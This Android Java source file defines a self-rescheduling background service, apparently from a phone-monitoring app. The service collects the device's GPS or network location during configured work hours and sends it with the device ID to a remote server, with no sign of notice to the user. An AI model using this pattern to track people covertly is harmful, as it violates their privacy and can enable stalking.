package com.inet.android.location;

import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Date;
import java.util.Iterator;
import java.util.List;

import android.annotation.SuppressLint;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.location.GpsSatellite;
import android.location.GpsStatus;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Bundle;
import android.os.IBinder;
import android.preference.PreferenceManager;
import android.text.format.DateFormat;
import android.util.Log;
import android.widget.Toast;
import android.widget.ListView.FixedViewInfo;

import com.inet.android.bs.FileLog;
import com.inet.android.bs.MainActivity;
import com.inet.android.bs.Request;
import com.inet.android.bs.WorkTimeDefiner;

public class GPSTracker extends Service implements LocationListener {

	private static final String TAG = "locationService";
	// flag for GPS status
	boolean isGPSEnabled = false;
	SharedPreferences sp;
	// flag for network status
	boolean isNetworkEnabled = false;
	String bestProvider = null;
	// flag for GPS status
	boolean canGetLocation = false;
	private Context context;
	Editor e;
	Location location; // location
	double latitude; // latitude
	double longitude; // longitude
	String locMetod;
	MainActivity simInfo;
	String ID;
	String nameId;
	int minute;
	private static final int SERVICE_REQUEST_CODE = 15;
	Request req;
	String provider;
	// The minimum distance to change Updates in meters
	private static final long MIN_DISTANCE_CHANGE_FOR_UPDATES = 50; // 100
																	// meters

	// The minimum time between updates in milliseconds
	private static long MIN_TIME_BW_UPDATES = 1000 * 30; // 30 minute

	// Declaring a Location Manager
	protected LocationManager locationManager;

	private boolean gpsFix = false;
	private int timeUp = 0;

	@Override
	public void onCreate() {
		Log.d(TAG, ">>>onCreate() GPS");
		FileLog.writeLog("locationManager: >>>onCreate() GPS");
	}

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		context = getApplicationContext();

		Log.d(TAG, "onStartCommand gpsTracker");
		FileLog.writeLog("locationManager: onStartCommand gpsTracker");

		sp = PreferenceManager.getDefaultSharedPreferences(context);
		String gpsEnd = sp.getString("ACTION", "OK");
		MIN_TIME_BW_UPDATES = Integer.parseInt(sp.getString("GEO", "5")) * 1000 * 60;
		timeUp = Integer.parseInt(sp.getString("GEO", "5"));
		if (gpsEnd.equals("REMOVE")) {
			Log.d(TAG, "REMOVE");
			FileLog.writeLog("locationManager: REMOVE");
			return 0;
		}
		boolean isWork = WorkTimeDefiner.isDoWork(getApplicationContext());
		if (!isWork) {
			Log.d(TAG, "isWork return " + Boolean.toString(isWork));
			Log.d(TAG, "after isWork retrun 0");
			FileLog.writeLog("locationManager: isWork return "
					+ Boolean.toString(isWork));
			FileLog.writeLog("locationManager: after isWork retrun 0");

			return 0;
		} else {
			Log.d(TAG, Boolean.toString(isWork));
			FileLog.writeLog("locationManager: isWork - "
					+ Boolean.toString(isWork));
		}

		getLocation();
		Log.d(TAG, ">>>onStartCommand()");
		FileLog.writeLog("locationManager: " + ">>>onStartCommand()");
		Calendar cal = Calendar.getInstance();
		cal.add(Calendar.MINUTE, timeUp);// через 1 минут
		PendingIntent servicePendingIntent = PendingIntent.getService(this,
				SERVICE_REQUEST_CODE, new Intent(this, GPSTracker.class),// SERVICE_REQUEST_CODE
																			// -
																			// уникальный
																			// int
																			// сервиса
				PendingIntent.FLAG_UPDATE_CURRENT);

		AlarmManager am = (AlarmManager) getSystemService(ALARM_SERVICE);
		am.set(AlarmManager.RTC_WAKEUP, cal.getTimeInMillis(),
				servicePendingIntent);

		super.onStartCommand(intent, flags, startId);
		return Service.START_STICKY;
	}

	public Location getLocation() {
		try {
			locationManager = (LocationManager) context
					.getSystemService(LOCATION_SERVICE);

			// getting GPS status
			isGPSEnabled = locationManager
					.isProviderEnabled(LocationManager.GPS_PROVIDER);
			Log.d("isGPS", Boolean.toString(isGPSEnabled));

			// getting network status
			isNetworkEnabled = locationManager
					.isProviderEnabled(LocationManager.NETWORK_PROVIDER);
			Log.d("isNetwork", Boolean.toString(isNetworkEnabled));
			getLast();

			if (!isGPSEnabled && !isNetworkEnabled) {
				// no network provider is enabled
				Log.d(TAG, "!isGPS&&isNetwork");
				sendNoLoc();
			} else {
				Log.d(TAG, longitude + " " + latitude);
				this.canGetLocation = true;

				// if GPS Enabled get lat/long using GPS Services
				if (isGPSEnabled) {
					if (location == null) {
						Log.d(TAG, "location == null");
						MyListener gpsListener = new MyListener();
						locationManager
								.addGpsStatusListener(gpsListener.gpsStatusListener);
						if (gpsFix == true) {
							Log.d(TAG, "gpsFix");
							gpsLoc();
						}
					}
				}
				if (isNetworkEnabled && gpsFix == false) {
					Log.d(TAG, "network");
					netLoc();
				}

			}

			if (Double.toString(latitude).equals("0.0")
					&& Double.toString(longitude).equals("0.0")) {
				Log.d(TAG, "equaels = 0.0");
				sendNoLoc();
			} else
				Log.d(TAG, "equaels good");
			sendLoc();

		} catch (Exception e) {
			e.printStackTrace();
		}

		return location;
	}

	public void getLast() {
		float accuracy;
		long time;

		Location bestResult = null;
		long bestTime = -1;
		float bestAccuracy = 1000;
		long minTime = 1000 * 60 * 60;
		List<String> matchingProviders = locationManager.getAllProviders();
		for (String provider : matchingProviders) {
			location = locationManager.getLastKnownLocation(provider);
			if (location != null) {
				accuracy = location.getAccuracy();
				time = location.getTime();

				if ((time > minTime && accuracy < bestAccuracy)) {
					bestResult = location;
					bestAccuracy = accuracy;
					bestTime = time;
					SimpleDateFormat TIMESTAMP = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
					 
			        // Выводим Дату по шаблону
			        String date1 = TIMESTAMP.format(bestTime);
					Log.d(TAG, "bestAccuracy" + date1 + " "
							+ accuracy + " " + bestResult);
				} else if (time < minTime && bestAccuracy == Float.MAX_VALUE
						&& time > bestTime) {
					bestResult = location;
					bestTime = time;
					Log.d(TAG, "else " + Long.toString(bestTime) + " "
							+ bestResult);

				}
			}
			if (location != null) {

				latitude = location.getLatitude();
				longitude = location.getLongitude();
				Log.d(TAG, "locationNet != null ");

			}

		}
		
	}

	public void netLoc() {
		locMetod = "network";
		locationManager.requestLocationUpdates(
				LocationManager.NETWORK_PROVIDER, MIN_TIME_BW_UPDATES,
				MIN_DISTANCE_CHANGE_FOR_UPDATES, this);
		Log.d("Network", "Network");
//		if (locationManager != null) {
//
//			// location = locationManager
//			// .getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
//			// Log.d(TAG, "locationMannet != null ");
//
//			if (location != null) {
//				if (Double.toString(latitude).equals("0.0")
//						&& Double.toString(longitude).equals("0.0")) {
//
//				} else {
//					latitude = location.getLatitude();
//					longitude = location.getLongitude();
//					Log.d(TAG, "locationNet != null ");
//				}
//			}
//		}
	}

	public void gpsLoc() {
		locMetod = "gps";
		locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER,
				MIN_TIME_BW_UPDATES, MIN_DISTANCE_CHANGE_FOR_UPDATES, this);
		Log.d("GPS", "GPS");
//		if (locationManager != null) {
//			// location = locationManager
//			// .getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
//			// Log.d(TAG, "locationMannet != null ");
//
//			if (location != null) {
//				if (Double.toString(latitude).equals("0.0")
//						&& Double.toString(longitude).equals("0.0")) {
//
//				} else {
//					latitude = location.getLatitude();
//					longitude = location.getLongitude();
//					Log.d(TAG, "locationGPS!= null ");
//				}
//			}
//		}

	}

	public void sendLoc() {
		if (Double.toString(latitude).equals("0.0")
				&& Double.toString(longitude).equals("0.0")) {
			Log.d(TAG, "equaels = 0.0");
			sendNoLoc();
		} else {

			sp = PreferenceManager.getDefaultSharedPreferences(this);
			String sendStr = "<packet><id>" + sp.getString("ID", "ID")
					+ "</id><time>" + logTime() + "</time><type>5</type><app>"
					+ getLatitude() + " " + getLongitude() + "</app><ttl>"
					+ locMetod + "</ttl></packet>";

			req = new Request(context);
			req.sendRequest(sendStr);

			Log.d(TAG, sendStr);
			FileLog.writeLog("locationManager: " + sendStr);
		}
	}

	public void sendNoLoc() {
		sp = PreferenceManager.getDefaultSharedPreferences(this);
		String sendStr = "<packet><id>"
				+ sp.getString("ID", "ID")
				+ "</id><time>"
				+ logTime()
				+ "</time><type>5</type><app>координаты неизвестны"
				+ "</app><ttl>Определение местонахождения не поддерживается</ttl></packet>";

		req = new Request(context);
		req.sendRequest(sendStr);

		Log.d(TAG, sendStr);
		FileLog.writeLog("locationManager: " + sendStr);
	}

	@SuppressLint("SimpleDateFormat")
	private String logTime() {
		SimpleDateFormat formatter = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
		Calendar cal = Calendar.getInstance();
		cal.setTimeInMillis(System.currentTimeMillis());
		return "" + formatter.format(cal.getTime());

	}

	/**
	 * Stop using GPS listener Calling this function will stop using GPS in your
	 * app
	 * */
	public void stopUsingGPS() {
		if (locationManager != null) {
			locationManager.removeUpdates(GPSTracker.this);
		}
	}

	/**
	 * Function to get latitude
	 * */
	public double getLatitude() {
		if (location != null) {
			latitude = location.getLatitude();
		}

		// return latitude
		return latitude;
	}

	/**
	 * Function to get longitude
	 * */
	public double getLongitude() {
		if (location != null) {
			longitude = location.getLongitude();
		}

		// return longitude
		return longitude;
	}

	/**
	 * Function to check GPS/wifi enabled
	 * 
	 * @return boolean
	 * */
	public boolean canGetLocation() {
		return this.canGetLocation;
	}

	/**
	 * Function to show settings alert dialog On pressing Settings button will
	 * lauch Settings Options
	 * */

	@Override
	public void onLocationChanged(Location location) {
		if (gpsFix == true) {
			Log.d(TAG, "loc change = gps");
			updateLocation(location);
			// locationManager.removeUpdates(this);

		} else {
			Log.d(TAG, "loc change = else");
			updateLocation(location);
//			locationManager.removeUpdates(this);

		}

	}

	public void updateLocation(Location location) {
		latitude = location.getLatitude();
		longitude = location.getLongitude();

	}

	@Override
	public void onProviderDisabled(String provider) {
	}

	@Override
	public void onProviderEnabled(String provider) {
	}

	@Override
	public void onStatusChanged(String provider, int status, Bundle extras) {
	}

	@Override
	public IBinder onBind(Intent arg0) {
		return null;
	}

	private class MyListener implements GpsStatus.Listener {
		GpsStatus.Listener gpsStatusListener = new GpsStatus.Listener() {
			public void onGpsStatusChanged(int event) {
				switch (event) {

				case GpsStatus.GPS_EVENT_STARTED:
					Log.d(TAG, "ongpsstatus changed started");
					// TODO: your code that get location updates,
					// e.g. set active location listener
					break;
				case GpsStatus.GPS_EVENT_FIRST_FIX:
					Log.d(TAG, "ongpsstatus changed fix");

				case GpsStatus.GPS_EVENT_SATELLITE_STATUS:
					Log.d(TAG, "ongpsstatus changed search");

					GpsStatus status = locationManager.getGpsStatus(null);
					Iterator<GpsSatellite> sats = status.getSatellites()
							.iterator();
					int count = 0;
					while (sats.hasNext()) {
						GpsSatellite gpssatellite = (GpsSatellite) sats.next();
						if (gpssatellite.usedInFix()) {
							count++;
						}
					}
					if (count >= 4) {
						gpsFix = true;
						gpsLoc();
					} else {
						gpsFix = false;
					}
				}

			};
		};

		@Override
		public void onGpsStatusChanged(int event) {
			// TODO Автоматически созданная заглушка метода

		}
	}
}
